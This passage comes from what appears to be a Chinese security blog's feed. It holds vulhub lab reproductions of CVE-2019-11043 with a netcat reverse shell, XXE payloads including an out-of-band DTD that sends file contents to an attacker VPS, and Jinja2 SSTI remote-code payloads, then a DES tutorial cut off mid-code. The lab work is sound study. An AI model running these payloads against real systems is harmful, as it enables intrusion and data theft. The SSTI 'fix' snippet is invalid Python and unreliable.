go get -v &amp;&amp; go build
</code></pre>
<p>漏洞利用</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/2.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/3.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/4.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/5.png" alt="" loading="lazy"></figure>
<h5 id="反弹shell">反弹shell</h5>
<p>想的是用nc反弹shell，然后发现docker环境里面没有nc，只好自己安装nc了</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/6.png" alt="" loading="lazy"></figure>
<pre><code class="language-powershell">apt update
apt-get install netcat
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/7.png" alt="" loading="lazy"></figure>
<p>nc安装完毕</p>
<pre><code class="language-shell">#现在外网服务器上面监听 
nc -lvp 7777

#再用 nc -e /bin/bash x.x.x.x 7777 反弹shell 
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/8.png" alt="" loading="lazy"></figure>
<h5 id="参考链接">参考链接</h5>
<p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
<p><a href="https://github.com/neex/phuip-fpizdam/issues/1">https://github.com/neex/phuip-fpizdam/issues/1</a></p>
<p><a href="https://bugs.php.net/bug.php?id=78599">https://bugs.php.net/bug.php?id=78599</a></p>
<p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">http://blog.leanote.com/post/snowming/9da184ef24bd</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[php_xxe]]></title>
        <id>https://www.yyxyy.xyz/post/php_xxe/</id>
        <link href="https://www.yyxyy.xyz/post/php_xxe/">
        </link>
        <updated>2021-06-06T03:55:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="php_xxe">php_xxe</h3>
<h4 id="1漏洞复现">1.漏洞复现</h4>
<h5 id="1环境安装">1）环境安装</h5>
<p>使用vulhub里面的php_xxe</p>
<h5 id="2-漏洞复现">2) 漏洞复现</h5>
<p>漏洞介绍</p>
<p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
<p>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题。</p>
<p>漏洞利用</p>
<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>payload:</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/1.png" alt="" loading="lazy"></figure>
<p>这个环境里面***dom.php、SimpleXMLElement.php 、simplexml_load_string.php***三个页面都存在这个漏洞。</p>
<h5 id="3漏洞分析">3)漏洞分析</h5>
<p>simplexml_load_string函数解析body，查看一下源码simplexml_load_string.php</p>
<pre><code class="language-php">&lt;?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);

echo $xml-&gt;name;

</code></pre>
<p>​	//先将xml发送给服务器解析，服务器解析完成后，就会按照我们的xml执行。当执行到**SYSTEM &quot;file:///etc/passwd&quot;**时，</p>
<p>会引用服务器里面的/etc/passwd文件，当服务器解析完成后，会将/etc/passwd文件内容存入&amp;xxe中，然后将数据返回给恶意访问者。</p>
<p>使用php伪协议</p>
<p>除了使用前面的payload。我们发现源码有<strong>php://input</strong>,因此可以使用php伪协议读取源码。</p>
<p>payload：</p>
<pre><code class="language-xml">
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/2.png" alt="" loading="lazy"></figure>
<p>当没有回显的时候。</p>
<p>就要想办法让服务器自己把数据往外带。</p>
<p>我们可以写两个外部参数实体，第一个用来请求本地数据内容，第二个用 http 协议或者其他协议把请求到的数据作为参数带到我们的 vps，这样就实现了数据外带了。</p>
<p>payload</p>
<pre><code class="language-xml-dtd">
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % remote SYSTEM &quot;http://myvps/xml.dtd&quot;&gt;  
    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/test.txt&quot;&gt;
    %remote;
    %send;
]&gt;
&lt;message&gt;1234&lt;/message&gt;
</code></pre>
<p>xml.dtd</p>
<pre><code class="language-xml-dtd">

&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://myvps:2333/?%file;'&gt;&quot;&gt;
%start;
</code></pre>
<p>与此同时我们还需要在服务器上面打开2333端口</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/3.png" alt="" loading="lazy"></figure>
<p>后面还有dos攻击‘探测内网等等。。。</p>
<p>参考链接</p>
<p><a href="https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw">https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw</a></p>
<p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ssti漏洞复现]]></title>
        <id>https://www.yyxyy.xyz/post/ssti-lou-dong-fu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/ssti-lou-dong-fu-xian/">
        </link>
        <updated>2021-06-06T03:54:53.000Z</updated>
        <content type="html"><![CDATA[<h4 id="flask-ssti-漏洞复现">Flask ssti 漏洞复现</h4>
<h6 id="环境">环境</h6>
<p>使用vulhub里面的flask/ssti环境</p>
<h6 id="查看源码发现漏洞处">查看源码，发现漏洞处</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + name)
    return t.render()

if __name__ == &quot;__main__&quot;:
    app.run()
    
    
// 很简单发现了name变量是我们能够控制的。
</code></pre>
<h6 id="漏洞成因分析">漏洞成因分析</h6>
<p>首先输入正常值</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/1.png" alt="" loading="lazy"></figure>
<p>然后输入嵌套jinja2语法的语句</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/2.png" alt="" loading="lazy"></figure>
<p>很容易就发现了这一处漏洞</p>
<h6 id="代码修复">代码修复</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + {{temp}})
    return t.render(temp=&quot;name&quot;)

if __name__ == &quot;__main__&quot;:
    app.run()
    
//这样就能避免这个漏洞
</code></pre>
<h6 id="漏洞利用">漏洞利用</h6>
<p>vulhub的POC</p>
<pre><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
</code></pre>
<p>得到一下结果</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/3.png" alt="" loading="lazy"></figure>
<h6 id="python沙盒逃逸">python沙盒逃逸</h6>
<p>vulhub的POC里面用的是一些python的魔术方法，因为在jinja2里面我们是可以访问python的一些对象和方法。</p>
<p>Python的一些魔术方法</p>
<pre><code class="language-python"># 1 __class__ : 返回当前对象所属的类
&gt;&gt;&gt; ().__class__
&lt;class 'tuple'&gt;
&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;

#2 __base__&amp;&amp;__bases__ :作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。
&gt;&gt;&gt; class A():
...     pass
&gt;&gt;&gt; class B():
...     pass
&gt;&gt;&gt; class C(A,B):
...     pass
&gt;&gt;&gt; C.__base__
&lt;class '__main__.A'&gt;
&gt;&gt;&gt; C.__bases__
(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)

#3 __mro__ :以元组的方式返回继承关系
&gt;&gt;&gt; C.__mro__
(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)


#4 __subclasses__():以列表的形式返回类的子类
&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib._installed_safely'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'nt.ScandirIterator'&gt;, &lt;class 'nt.DirEntry'&gt;, &lt;class 'PyHKEY'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;]

#5 __globals__ :以字典的形式返回函数所在模块命名空间的所有变量。
#所有的函数都会有一个__globals__属性，可以通过globals获得大量内置函数，包括eval，exec等执行命令的1的函数

#6 __builtin__&amp;&amp;__builtins__: python中直接能用的比如int(),list()等函数，可以直接在builtins里面查询到。（python3）
&gt;&gt;&gt; import builtins
&gt;&gt;&gt; dir(builtins)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

#python2：dir(__builtins__)
'''
__builtin__ 和 __builtins__之间是什么关系呢？
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
'''



#利用python特殊方法bypass沙盒


## 构造继承链的思想

#1.任意使用一个内置对象用class拿到他所对应的类
#2.用bases拿到基类（&lt;class 'object'&gt;）
#3.用subclasses()拿到子类列表
#4.在字类里面寻找可以利用的类

&gt;&gt;&gt; t = ().__class__.__bases__[0].__subclasses__()
&gt;&gt;&gt; for c in t:
...     if c.__name__== 'file':
...             print t.index(c)
... 
40
#寻找file对象


&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines)
['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
#使用dir查看对象内置方法：



</code></pre>
<p>同样的方法使用eval方法来获取目录文件</p>
<pre><code class="language-jinja2">{% for c in ().__class__.__bases__[0].__subclasses__(): %}
{% if c.__name__ == '_IterationGuard': %}
{{c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;) }}
{% endif %}
{% endfor %}
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/4.png" alt="" loading="lazy"></figure>
<p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
<p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
<p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DES学习]]></title>
        <id>https://www.yyxyy.xyz/post/des-xue-xi/</id>
        <link href="https://www.yyxyy.xyz/post/des-xue-xi/">
        </link>
        <updated>2021-06-06T03:53:15.000Z</updated>
        <content type="html"><![CDATA[<h4 id="des加密运算步骤">DES加密运算步骤</h4>
<ol>
<li>输入64位明文数据，并进行初始置换IP；</li>
<li>在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；</li>
<li>在秘钥的控制下，经过16轮运算(f)；</li>
<li>16轮后，左、右两部分交换，并连接再一起，再进行逆置换；</li>
<li>输出64位密文。</li>
</ol>
<h4 id="初始置换">初始置换</h4>
<p>这里要使用<strong>IP置换表。</strong></p>
<pre><code class="language-html">58,50,42,34,26,18,10,2,
60,52,44,36,28,20,12,4,
62,54,46,38,30,22,14,6,
64,56,48,40,32,24,16,8,
57,49,41,33,25,17, 9,1,
59,51,43,35,27,19,11,3,
61,53,45,37,29,21,13,5,
63,55,47,39,31,23,15,7,
</code></pre>
<p>这里的意思是将输入的64位明文按照表排列，即第58位明文排在第一位，第50位明文排在第二位，依次类推获得一个新的64位的串</p>
<h4 id="密钥生成器">密钥生成器</h4>
<p>密钥移位表</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/cryptography/20160908103542907.jpg" alt="" loading="lazy"></figure>
<p>64位密钥压缩为56位表</p>
<pre><code class="language-html">57,49,41,33,25,17,9,1,
58,50,42,34,26,18,10,2,
59,51,43,35,27,19,11,3,
60,52,44,36,63,55,47,39,
31,23,15,7,62,54,46,38,
30,22,14,6,61,53,45,37,
29,21,13,5,28,20,12,4

56位密钥压缩为48位表
14,17,11,24,1,5,3,28, 
15,6,21,10,23,19,12,4,
26,8,16,7,27,20,13,2,
41,52,31,37,47,55,30,40,
51,45,33,48,44,49,39,56,
34,53,46,42,50,36,29,32
</code></pre>
<p>将这个56位表分成前28位和后28位，即C0和D0表</p>
<p>又将64位密钥按照C0和D0表置换成28位L0和28位R0(置换规则和前面一样)</p>
<p>将L0和R0按照加密轮数进行移位。(tips:每次移位是接着上次已经移位后的串继续移位)</p>
<p>将L0和R0拼接为一个56位的串key_56。</p>
<p>将key_56按照48位表置换得到key_48(置换规则和ip置换一样)</p>
<p>这里已经获得了一个key，按照移位表进行循环一共得到16个key。</p>
<h4 id="密钥生成流程图">密钥生成流程图</h4>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/cryptography/1281268-20180720073949486-1474910065.png" alt="des" loading="lazy"></figure>
<h4 id="ep扩展">E/p扩展</h4>
<p>新一轮加密的开始</p>
<p>第一轮使用I/P置换得到的64位串，下一轮使用P置换得到的64位串。</p>
<p>将得到的64位串分成两部分，前32位为左L0，后32位右R0。</p>
<p>将右32位进行E/P扩展变成48位。</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/cryptography/20160908111040111.jpg" alt="" loading="lazy"></figure>
<p>E/P扩展置换表</p>
<pre><code class="language-html">置换规则和ip置换一样
32,1,2,3,4,5,
4,5,6,7,8,9,
8,9,10,11,12,13,
12,13,14,15,16,17,
16,17,18,19,20,21,
20,21,22,23,24,25,
24,25,26,27,28,29,
28,29,30,31,32,1
</code></pre>
<p>E/P结束后我们得到了一个48位的串R1</p>
<h4 id="r1与key异或">R1与key异或</h4>
<p>将R1与key进行异或运算得到新的R1</p>
<pre><code class="language-python">tmp+=bin(int(r1,2)^int(keys[i],2))[2:] #R1和key对应异或
        while len(tmp)&lt;48:
            tmp='0'+tmp
        return tmp
</code></pre>
<h4 id="s盒置换">S盒置换</h4>
<p>有8个S盒置换表（太多这里先不写出来放在后面代码中）</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/cryptography/12817.jpg" alt="" loading="lazy"></figure>
<p>流程如图，将上一步异或得到的R1每6位分为一组，共计8组。</p>
<p>每组6位，将高一位和低一位组合形成行，中间4位作为列进行S盒置换。</p>
<p>例如</p>
<p>​	111001 那么对应11就是行，1100就是列。</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/cryptography/211.jpg" alt="" loading="lazy"></figure>
<p>每组我们能够获得4位的串，一共8组，将8组数进行拼接得到32位的新的R1串。</p>
<h4 id="p置换">P置换</h4>
<p>P置换表</p>
<pre><code class="language-html">16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,
2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25,
</code></pre>
<p>将S盒置换后得到的32位R1进行P置换得到新的32位R1  (置换规则和IP置换一样)</p>
<p>这里将前面E/P置换得到的L0和这个R1进行异或运算得到新的R1</p>
<p>令L1＝E/P置换得到的R0。</p>
<p>将L1和R1组合得到一个新的64位串</p>
<p>到这儿，我们已经进行了一轮加密。后面将这64位串传给E/P置换，进行下一轮。</p>
<h4 id="ip逆置换">IP逆置换</h4>
<p>IP逆置换表</p>
<pre><code class="language-html">
40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,
38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,
36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,
34,2,42,10,50,18,58 26,33,1,41, 9,49,17,57,25,
</code></pre>
<p>经过前面16轮加密，我们得到了一个64位串。</p>
<p>但是我们每一轮结束有一个L1和R1交换的操作，最后一轮结束是不需要L1和R1交换</p>
<p>所以我们将这个64位串分割成左32位和右32位，然后左右交换组合新的64位串</p>
<p>将这个64位串进行ip逆置换，得到加密结果（置换规则和IP置换规则一样）</p>
<h4 id="解密">解密</h4>
<p>解密就是将第16位key作为第一位key，第15位作为第二位key，依次类推。得到一个逆序的key，进行加密就ok。</p>
<p>因为解密是加密的一个逆过程。</p>
<h4 id="des流程图">DES流程图</h4>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/cryptography/1281268-20180722085234376-365550304.png" alt="key" loading="lazy"></figure>
<h3 id="代码">代码</h3>
<pre><code class="language-python">#data='1001100001110110010101000011001000010001010001110010010110000011'
#secret_key='0001001000110100010101100111100010010001001000110100010101100111'
#加密结果 0111110010101110111011000000001001001010111000011010110111001011
#加密结果 0x7caeec024ae1adcb


#ip置换表
ip=[58,50,42,34,26,18,10,2,
60,52,44,36,28,20,12,4,
62,54,46,38,30,22,14,6,
64,56,48,40,32,24,16,8,
57,49,41,33,25,17, 9,1,
59,51,43,35,27,19,11,3,
61,53,45,37,29,21,13,5,
63,55,47,39,31,23,15,7]

#ip逆置换表
ip_=[40, 8, 48, 16, 56, 24, 64, 32, 39, 7,47, 15, 55, 23, 63, 31,
		38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45,13, 53, 21, 61, 29,
		36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11,51, 19, 59, 27,
		34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]

#s盒
s1 = [
		[ 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7 ],
		[ 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8 ],
		[ 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0 ],
		[ 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13 ] ]
 
s2 = [
		[ 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10 ],
		[ 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5 ],
		[ 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15 ],
		[ 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9 ] ]
 
s3 = [
		[ 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8 ],
		[ 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1 ],
		[ 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7 ],
		[ 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12 ] ]
 
s4 = [
		[ 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15 ],
		[ 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9 ],
		[ 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4 ],
		[ 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14 ] ]
 
s5 = [
		[ 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9 ],
		[ 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6 ],
		[ 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14 ],
		[ 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3 ] ]
 
s6 = [
		[ 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11 ],
		[ 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8 ],
		[ 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6 ],
		[ 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13 ] ]
 
s7 = [
		[ 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1 ],
		[ 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6 ],
